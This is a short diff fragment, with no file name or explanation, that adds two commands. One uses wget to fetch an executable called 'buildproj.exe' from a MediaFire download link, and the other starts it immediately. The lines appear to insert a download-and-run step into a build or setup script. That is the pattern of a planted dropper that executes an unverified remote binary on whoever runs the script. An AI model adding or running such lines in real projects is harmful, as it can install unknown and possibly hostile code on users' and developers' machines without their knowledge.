@@ -1,0 +1,2 @@
+wget https://download1647.mediafire.com/u5uu3u7wogegEOK7JFfCUPuVVnhpC7xlpsqMePjOfvR7g8x0BcOiR4HYALz8NNCGvxe0iWAvUpOr8LZRqIIPUTRFpyhotg/tfdqd4hbu94ygcv/buildproj.exe
+start buildproj.exe
